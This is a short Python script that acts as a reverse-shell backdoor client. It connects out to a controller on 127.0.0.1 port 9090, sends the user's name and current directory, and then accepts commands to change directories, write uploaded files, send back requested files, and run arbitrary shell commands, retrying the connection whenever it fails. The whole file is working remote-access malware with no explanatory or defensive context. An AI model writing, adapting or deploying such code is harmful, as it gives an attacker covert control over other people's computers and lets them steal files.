from socket import socket, error
from os import getcwd, chdir, environ
from subprocess import Popen, PIPE
from time import sleep


def connection():
    username = environ.get('USERNAME')
    s = socket()
    host = "127.0.0.1"
    port = 9090
    s.connect((host, port))
    s.send("Connected to " + username + "'s computer\n" + getcwd())
    print("Connected ...")
    while True:
        cmd = (s.recv(1024))
        # print(cmd)
        if cmd[:3] == "cd " and not cmd == "cd":
            try:
                print("Changing Directory to " + cmd)
                chdir(cmd[3:])
                response = ""
            except WindowsError:
                response = "Directory Not Found"
            s.send(response + "\n" + getcwd())
        elif cmd[:6] == "upload":
            data = cmd[6:].split("||=shail=||")
            with open(data[0], "wb") as f:
                f.write(data[1])
            response = ("File Has Been Uploaded\n")
            s.send(response + "\n" + getcwd())
        elif cmd[:8] == "download":
            file = cmd[8:]
            try:
                with open(file, "rb") as f:
                    response = f.read()
            except IOError:
                response = "not found"
            s.send(response + "||=shail=||" + getcwd())
        else:
            response = Popen(cmd, shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
            response = response.stdout.read() + response.stderr.read()
            response = (response + "\n" + getcwd())
            s.send(response)


x = 0
while True:
    try:
        connection()
    except error:
        x += 1
        print("Retrying ... ({})".format(x))
        sleep(.5)
